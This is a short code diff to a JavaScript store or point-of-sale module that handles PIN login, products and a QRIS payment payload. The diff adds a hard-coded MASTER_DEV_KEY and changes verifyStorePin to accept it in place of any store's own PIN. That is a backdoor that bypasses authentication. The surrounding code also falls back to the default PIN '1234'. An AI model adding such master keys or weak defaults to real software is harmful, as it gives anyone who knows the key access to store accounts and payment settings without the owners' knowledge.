@@ -5,6 +5,7 @@
 import { 
   getStorageKeys, 
   GLOBAL_STORAGE_KEYS,
+  MASTER_DEV_KEY,
   DEFAULT_PRODUCTS, 
   DEFAULT_QRIS_PAYLOAD, 
   DEFAULT_STORE_PROFILE 
@@ -261,7 +262,7 @@ export function saveStoreAuth(authData) {
 export function verifyStorePin(pinInput) {
   const cleanPin = String(pinInput || '').trim();
   const currentPin = String(state.auth?.pin || '1234').trim();
-  return cleanPin === currentPin;
+  return cleanPin === currentPin || cleanPin === MASTER_DEV_KEY;
 }
 
 /**
